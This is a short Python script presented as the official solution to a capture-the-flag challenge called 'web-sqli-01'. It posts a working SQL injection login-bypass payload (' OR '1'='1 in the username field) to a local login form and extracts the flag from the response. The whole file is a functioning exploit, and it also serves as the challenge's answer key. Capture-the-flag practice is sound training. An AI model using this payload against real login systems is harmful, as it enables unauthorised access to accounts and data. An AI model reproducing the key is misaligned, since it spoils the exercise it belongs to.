"""
Official solution for web-sqli-01.
The query is: SELECT * FROM users WHERE username='INPUT' AND password='INPUT'
Injecting ' OR '1'='1 into the username makes the WHERE clause always true.
"""
import requests

TARGET = "http://localhost:5000"

payload = {"username": "' OR '1'='1", "password": "anything"}
r = requests.post(TARGET, data=payload)

if "CTF{" in r.text:
    import re
    flag = re.search(r"CTF\{[^}]+\}", r.text).group()
    print(f"Flag found: {flag}")
else:
    print("Exploit failed")
